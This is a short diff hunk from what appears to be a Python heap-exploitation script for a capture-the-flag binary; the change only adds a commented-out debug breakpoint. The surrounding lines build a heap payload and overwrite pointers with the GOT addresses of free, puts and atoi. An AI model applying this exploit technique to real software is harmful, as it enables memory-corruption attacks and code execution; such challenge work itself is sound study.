@@ -81,6 +81,7 @@ if __name__ == "__main__":
     payload += p64(0x90) # 3's size
     #  DEBUG([0x4009E8, 0x400B06, 0x400B7A])
     read(2, payload)
+    #  DEBUG([0x400B7A])
     release(3)
 
     read(2, 'a' * 8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi']))
